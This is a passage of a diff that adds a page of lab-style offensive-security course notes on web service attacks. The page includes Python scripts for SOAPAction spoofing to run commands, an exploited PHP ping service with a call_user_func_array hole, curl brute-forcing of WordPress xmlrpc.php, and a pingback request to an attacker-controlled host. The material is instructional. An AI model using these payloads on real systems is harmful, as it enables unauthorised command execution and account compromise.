+      &lt;s:element name="ExecuteCommandResponse"&gt;
+        
+        &lt;s:complexType&gt;
+          &lt;s:sequence&gt;
+            &lt;s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/&gt;
+          &lt;/s:sequence&gt;
+        &lt;/s:complexType&gt;
+        
+      &lt;/s:element&gt;
+      
+      
+      
+    &lt;/s:schema&gt;
+    
+    
+  &lt;/wsdl:types&gt;
+  
+  
+  
+  
+  &lt;!-- Login Messages --&gt;
+  &lt;wsdl:message name="LoginSoapIn"&gt;
+    
+    &lt;wsdl:part name="parameters" element="tns:LoginRequest"/&gt;
+    
+  &lt;/wsdl:message&gt;
+  
+  
+  &lt;wsdl:message name="LoginSoapOut"&gt;
+    
+    &lt;wsdl:part name="parameters" element="tns:LoginResponse"/&gt;
+    
+  &lt;/wsdl:message&gt;
+  
+  
+  &lt;!-- ExecuteCommand Messages --&gt;
+  &lt;wsdl:message name="ExecuteCommandSoapIn"&gt;
+    
+    &lt;wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/&gt;
+    
+  &lt;/wsdl:message&gt;
+  
+  
+  &lt;wsdl:message name="ExecuteCommandSoapOut"&gt;
+    
+    &lt;wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/&gt;
+    
+  &lt;/wsdl:message&gt;
+  
+  
+  
+  
+  
+  &lt;wsdl:portType name="HacktheBoxSoapPort"&gt;
+    
+    
+    &lt;!-- Login Operaion | PORT --&gt;
+    &lt;wsdl:operation name="Login"&gt;
+      
+      &lt;wsdl:input message="tns:LoginSoapIn"/&gt;
+      &lt;wsdl:output message="tns:LoginSoapOut"/&gt;
+      
+    &lt;/wsdl:operation&gt;
+    
+    
+    &lt;!-- ExecuteCommand Operation | PORT --&gt;
+    &lt;wsdl:operation name="ExecuteCommand"&gt;
+      
+      &lt;wsdl:input message="tns:ExecuteCommandSoapIn"/&gt;
+      &lt;wsdl:output message="tns:ExecuteCommandSoapOut"/&gt;
+      
+    &lt;/wsdl:operation&gt;
+    
+  &lt;/wsdl:portType&gt;
+  
+  
+  
+  
+  
+  &lt;wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort"&gt;
+    
+    
+    &lt;soap:binding transport="http://schemas.xmlsoap.org/soap/http"/&gt;
+    
+    &lt;!-- SOAP Login Action --&gt;
+    &lt;wsdl:operation name="Login"&gt;
+      
+      &lt;soap:operation soapAction="Login" style="document"/&gt;
+      
+      &lt;wsdl:input&gt;
+        &lt;soap:body use="literal"/&gt;
+      &lt;/wsdl:input&gt;
+      
+      &lt;wsdl:output&gt;
+        &lt;soap:body use="literal"/&gt;
+      &lt;/wsdl:output&gt;
+      
+    &lt;/wsdl:operation&gt;
+    
+    
+    &lt;!-- SOAP ExecuteCommand Action --&gt;
+    &lt;wsdl:operation name="ExecuteCommand"&gt;
+      &lt;soap:operation soapAction="ExecuteCommand" style="document"/&gt;
+      
+      &lt;wsdl:input&gt;
+        &lt;soap:body use="literal"/&gt;
+      &lt;/wsdl:input&gt;
+      
+      &lt;wsdl:output&gt;
+        &lt;soap:body use="literal"/&gt;
+      &lt;/wsdl:output&gt;
+    &lt;/wsdl:operation&gt;
+    
+    
+  &lt;/wsdl:binding&gt;
+  
+  
+  
+  
+  
+  &lt;wsdl:service name="HacktheboxService"&gt;
+    
+    
+    &lt;wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding"&gt;
+      &lt;soap:address location="http://localhost:80/wsdl"/&gt;
+    &lt;/wsdl:port&gt;
+    
+    
+  &lt;/wsdl:service&gt;
+  
+  
+  
+  
+  
+&lt;/wsdl:definitions&gt;
+</code></pre>
+<p>The first thing to pay attention to is the following:</p>
+<pre><code class="language-xml">&lt;wsdl:operation name="ExecuteCommand"&gt;
+&lt;soap:operation soapAction="ExecuteCommand" style="document"/&gt;
+</code></pre>
+<p>You can see a SOAPAction operation called <code>ExecuteCommand</code>.</p>
+<p>Take a look at the params:</p>
+<pre><code class="language-xml">&lt;s:element name="ExecuteCommandRequest"&gt;
+&lt;s:complexType&gt;
+&lt;s:sequence&gt;
+&lt;s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/&gt;
+&lt;/s:sequence&gt;
+&lt;/s:complexType&gt;
+&lt;/s:element&gt;
+</code></pre>
+<p>You notice that there is a <code>cmd</code> parameter. The below script will try to have the SOAP service execute a <code>whoami</code> command:</p>
+<pre><code class="language-python">import requests
+
+payload = '&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"&gt;&lt;soap:Body&gt;&lt;ExecuteCommandRequest xmlns="http://tempuri.org/"&gt;&lt;cmd&gt;whoami&lt;/cmd&gt;&lt;/ExecuteCommandRequest&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;'
+
+print(requests.post("http://&lt;TARGET IP&gt;:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+</code></pre>
+<p>When executed:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ python3 client.py
+b'&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"&gt;&lt;soap:Body&gt;&lt;ExecuteCommandResponse xmlns="http://tempuri.org/"&gt;&lt;success&gt;false&lt;/success&gt;&lt;error&gt;This function is only allowed in internal networks&lt;/error&gt;&lt;/ExecuteCommandResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;'
+</code></pre>
+<p>You get an error mentioning "This function is only allowed in internal networks". You have no access to the internal networks. Try a SOAPAction spoofing attack, as follows:</p>
+<pre><code class="language-python">import requests
+
+payload = '&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"&gt;&lt;soap:Body&gt;&lt;LoginRequest xmlns="http://tempuri.org/"&gt;&lt;cmd&gt;whoami&lt;/cmd&gt;&lt;/LoginRequest&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;'
+
+print(requests.post("http://&lt;TARGET IP&gt;:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+</code></pre>
+<ul>
+<li>you specify <code>LoginRequest</code> in <code>&lt;soap:body&gt;</code>, so that your request goes through; this operation is allowed from the outside</li>
+<li>you specify the parameters of <code>ExecuteCommand</code> because you want to have the SOAP service execute a <code>whoami</code> command</li>
+<li>you specify the blocked operation (<em><code>ExecuteCommand</code></em>) in the SOAPAction header</li>
+</ul>
+<p>If the web service determines the operation to be executed based solely on the SOAPAction header, you may bypass the restrictions and have the SOAP service execute a <code>whoami</code> command.</p>
+<p>When executed:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ python3 client_soapaction_spoofing.py
+b'&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"&gt;&lt;soap:Body&gt;&lt;LoginResponse xmlns="http://tempuri.org/"&gt;&lt;success&gt;true&lt;/success&gt;&lt;result&gt;root\n&lt;/result&gt;&lt;/LoginResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;'
+</code></pre>
+<p>The <code>whoami</code> command executed successfully, bypassing the restrictions through SOAPAction spoofing!</p>
+<p>If you want to be able to specify mulitple commands and see the result each time, use the following Python script:</p>
+<pre><code class="language-python">import requests
+
+while True:
+    cmd = input("$ ")
+    payload = f'&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"&gt;&lt;soap:Body&gt;&lt;LoginRequest xmlns="http://tempuri.org/"&gt;&lt;cmd&gt;{cmd}&lt;/cmd&gt;&lt;/LoginRequest&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;'
+    print(requests.post("http://&lt;TARGET IP&gt;:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+</code></pre>
+<h2 id="command-injection"><a class="header" href="#command-injection">Command Injection</a></h2>
+<h3 id="example-1"><a class="header" href="#example-1">Example</a></h3>
+<p>Suppose you are accessing a connectivity-checking service residing in <code>http://&lt;TARGET IP&gt;:3003/ping-server.php/ping</code>. Suppose you have also been provided with the source code of the service.</p>
+<pre><code class="language-php">&lt;?php
+function ping($host_url_ip, $packets) {
+        if (!in_array($packets, array(1, 2, 3, 4))) {
+                die('Only 1-4 packets!');
+        }
+        $cmd = "ping -c" . $packets . " " . escapeshellarg($host_url_ip);
+        $delimiter = "\n" . str_repeat('-', 50) . "\n";
+        echo $delimiter . implode($delimiter, array("Command:", $cmd, "Returned:", shell_exec($cmd)));
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'GET') {
+        $prt = explode('/', $_SERVER['PATH_INFO']);
+        call_user_func_array($prt[1], array_slice($prt, 2));
+}
+?&gt;
+</code></pre>
+<ul>
+<li>a function called <em>ping</em> is defined, which takes two arguments <em>host_url_ip</em> and <em>packets</em>; the request should look similar to <code>http://&lt;TARGET IP&gt;:3003/ping-server.php/ping/&lt;VPN/TUN Adapter IP&gt;/3</code></li>
+<li>the code also checks if the <em>packets</em>'s value is more than 4, and it does that via an array</li>
+<li>a variable called <em>cmd</em> is then created, which forms the ping command to be executed; two values are "parsed", <em>packets</em> and <em>host_url</em></li>
+</ul>
+<blockquote>
+<p>[!NOTE]
+<em>escapeshellarg()</em> adds single quotes around a string and quotes/escapes any existing single quotes allowing you to pass a string directly to a shell function and having it be treated as a single safe argument.<br>
+This function should be used to escape individual arguments to shell functions coming from user input.<br>
+The shell functions include exec(), system(), shell_exec() and the backtick operator.<br>
+If the <em>host_url</em>'s value was not escaped, easy command injection could happen.</p>
+</blockquote>
+<ul>
+<li>the command specified by the <em>cmd</em> parameter is executed with the help of the shell_exec() PHP function</li>
+<li>if the request method is GET, an existing function can be called with the help of call_user_func_array(); the call_user_func_array() function is a special way to call an existing PHP function; it takes a function to call as its first parameter, then takes an array of parameters as its second parameter; this means that instead of <code>http://&lt;TARGET IP&gt;:3003/ping-server.php/ping/www.example.com/3</code> an attacker could issue a request as ```http://<TARGET IP>:3003/ping-server.php/system/ls``</li>
+</ul>
+<pre><code class="language-bash">d41y@htb[/htb]$ curl http://&lt;TARGET IP&gt;:3003/ping-server.php/system/ls
+index.php
+ping-server.php
+</code></pre>
+<h2 id="attacking-wordpress-xmlrpcphp"><a class="header" href="#attacking-wordpress-xmlrpcphp">Attacking WordPress <em>xmlrpc.php</em></a></h2>
+<h3 id="example-2"><a class="header" href="#example-2">Example</a></h3>
+<p>Suppose you are assessing the security of a WordPress instance residing in <code>http://blog.inlanefreight.com</code>. Through enumeration activities, you identified a valid username, <code>admin</code>, and that <code>xmlrpc.php</code> is enabled. Identifying if <code>xmlrpc.php</code> is enabled is as easy as requesting <code>xmlrpc.php</code> on the domain you are assessing.</p>
+<p>You can mount a password brute-forcing attack through <code>xmlrpc.php</code>:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ curl -X POST -d "&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;CORRECT-PASSWORD&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;" http://blog.inlanefreight.com/xmlrpc.php
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;methodResponse&gt;
+  &lt;params&gt;
+    &lt;param&gt;
+      &lt;value&gt;
+      &lt;array&gt;&lt;data&gt;
+  &lt;value&gt;&lt;struct&gt;
+  &lt;member&gt;&lt;name&gt;isAdmin&lt;/name&gt;&lt;value&gt;&lt;boolean&gt;1&lt;/boolean&gt;&lt;/value&gt;&lt;/member&gt;
+  &lt;member&gt;&lt;name&gt;url&lt;/name&gt;&lt;value&gt;&lt;string&gt;http://blog.inlanefreight.com/&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
+  &lt;member&gt;&lt;name&gt;blogid&lt;/name&gt;&lt;value&gt;&lt;string&gt;1&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
+  &lt;member&gt;&lt;name&gt;blogName&lt;/name&gt;&lt;value&gt;&lt;string&gt;Inlanefreight&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
+  &lt;member&gt;&lt;name&gt;xmlrpc&lt;/name&gt;&lt;value&gt;&lt;string&gt;http://blog.inlanefreight.com/xmlrpc.php&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
+&lt;/struct&gt;&lt;/value&gt;
+&lt;/data&gt;&lt;/array&gt;
+      &lt;/value&gt;
+    &lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodResponse&gt;
+</code></pre>
+<p>Above, you can see a successful login attempt through <code>xmlrpc.php</code>.</p>
+<p>You will receive a <code>403 faultCode</code> error if the creds are not valid.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ curl -X POST -d "&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;WRONG-PASSWORD&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;" http://blog.inlanefreight.com/xmlrpc.php
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;methodResponse&gt;
+  &lt;fault&gt;
+    &lt;value&gt;
+      &lt;struct&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultCode&lt;/name&gt;
+          &lt;value&gt;&lt;int&gt;403&lt;/int&gt;&lt;/value&gt;
+        &lt;/member&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultString&lt;/name&gt;
+          &lt;value&gt;&lt;string&gt;Incorrect username or password.&lt;/string&gt;&lt;/value&gt;
+        &lt;/member&gt;
+      &lt;/struct&gt;
+    &lt;/value&gt;
+  &lt;/fault&gt;
+&lt;/methodResponse&gt;
+</code></pre>
+<p>You identified the correct method to call by going through the well-documented <a href="https://codex.wordpress.org/XML-RPC/system.listMethods">WordPress code</a> and interacting with <code>xmlrpc.php</code>:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ curl -s -X POST -d "&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;/methodCall&gt;" http://blog.inlanefreight.com/xmlrpc.php
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;methodResponse&gt;
+  &lt;params&gt;
+    &lt;param&gt;
+      &lt;value&gt;
+      &lt;array&gt;&lt;data&gt;
+  &lt;value&gt;&lt;string&gt;system.multicall&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;system.listMethods&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;system.getCapabilities&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;demo.addTwoNumbers&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;demo.sayHello&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;pingback.extensions.getPingbacks&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;pingback.ping&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.publishPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.getTrackbackPings&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.supportedTextFilters&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.supportedMethods&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.setPostCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.getPostCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.getRecentPostTitles&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;mt.getCategoryList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.deletePost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.newMediaObject&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.getCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.getRecentPosts&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.getPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.editPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;metaWeblog.newPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.deletePost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.editPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.newPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.getRecentPosts&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.getPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.getUserInfo&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;blogger.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.restoreRevision&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getRevisions&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPostTypes&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPostType&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPostFormats&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getMediaLibrary&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getMediaItem&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getCommentStatusList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newComment&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editComment&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deleteComment&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getComments&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getComment&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.setOptions&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getOptions&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPageTemplates&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPageStatusList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPostStatusList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getCommentCount&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deleteFile&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.uploadFile&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.suggestCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deleteCategory&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newCategory&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTags&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getCategories&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getAuthors&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPageList&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editPage&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deletePage&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newPage&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPages&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPage&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editProfile&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getProfile&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getUsers&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getUser&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTaxonomies&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTaxonomy&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTerms&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTerm&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deleteTerm&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editTerm&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newTerm&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPosts&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deletePost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+&lt;/data&gt;&lt;/array&gt;
+      &lt;/value&gt;
+    &lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodResponse&gt;
+</code></pre>
+<p>Inside the list of availabe methods above, <code>pingback.ping</code> is included. It allows for XML-RPC pingbacks. According to WordPress, a pingback is a special type of comment that's created when you link to another blog post, as long as the other blog is set to accept pingbacks.</p>
+<p>Unfortunately, if pingbacks are available, they can facilitate:</p>
+<ul>
+<li>IP disclosure
+<ul>
+<li>an attacker can call the <code>pingback.ping</code> method on a WordPress instance behind Cloudflare to identify its public IP; the pingback should point to an attacker-controlled host accessible by the WordPress instance</li>
+</ul>
+</li>
+<li>Cross-Site Port Attack (<em>XSPA</em>)
+<ul>
+<li>an attacker can clal the <code>pingback.ping</code> method on a WordPress instance against itself on different ports; open ports or internal hosts can be identified by looking for response time differences or response differences</li>
+</ul>
+</li>
+<li>DDoS
+<ul>
+<li>an attacker cann call the <code>pingback.ping</code> method on numerous WordPress instances against a single target</li>
+</ul>
+</li>
+</ul>
+<h4 id="ip-disclosure"><a class="header" href="#ip-disclosure">IP Disclosure</a></h4>
+<p>Suppose that the WordPress instance residing in <code>http://blog.inlanefreight.com</code> is protected by Cloudflare. You identified <code>xmlrpc.php</code> and <code>pingback.ping</code> is available.</p>
+<p>As soon as the below request is sent, the attacker-controlled host will receive a request originating from <code>http://blog.inlanefreight.com</code>, verifying the pingback and exposing <code>http://blog.inlanefreight.com</code>'s public IP address.</p>
+<pre><code class="language-http">--&gt; POST /xmlrpc.php HTTP/1.1 
+Host: blog.inlanefreight.com 
+Connection: keep-alive 
+Content-Length: 293
+
+&lt;methodCall&gt;
+&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
+&lt;params&gt;
+&lt;param&gt;
+&lt;value&gt;&lt;string&gt;http://attacker-controlled-host.com/&lt;/string&gt;&lt;/value&gt;
+&lt;/param&gt;
+&lt;param&gt;
+&lt;value&gt;&lt;string&gt;https://blog.inlanefreight.com/2015/10/what-is-cybersecurity/&lt;/string&gt;&lt;/value&gt;
+&lt;/param&gt;
+&lt;/params&gt;
+&lt;/methodCall&gt;
+```&lt;!-- {% embed footer message="2025 • Created by [d41y](https://github.com/d41y)" %} --&gt;
+
+&lt;div data-embedify data-app="footer" data-option-message="2025 • Created by [d41y](https://github.com/d41y)" style="display:none"&gt;&lt;/div&gt;
+
+&lt;style&gt;footer { text-align: center; text-wrap: balance; margin-top: 5rem; display: flex; flex-direction: column; justify-content: center; align-items: center; } footer p { margin: 0; }&lt;/style&gt;&lt;footer&gt;&lt;p&gt;2025 • Created by &lt;a href="https://github.com/d41y"&gt;d41y&lt;/a&gt;&lt;/p&gt;&lt;/footer&gt;</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../../attack/web/web_attacks/web_service_api/api_attacks.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../../attack/web/authentication/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../../attack/web/web_attacks/web_service_api/api_attacks.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../../attack/web/authentication/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../../elasticlunr.min.js"></script>
+        <script src="../../../../mark.min.js"></script>
+        <script src="../../../../searcher.js"></script>
+
+        <script src="../../../../clipboard.min.js"></script>
+        <script src="../../../../highlight.js"></script>
+        <script src="../../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+        <script src="../../../../theme/pagetoc.js"></script>
+
+
+
+    </div>
+    </body>
+</html>
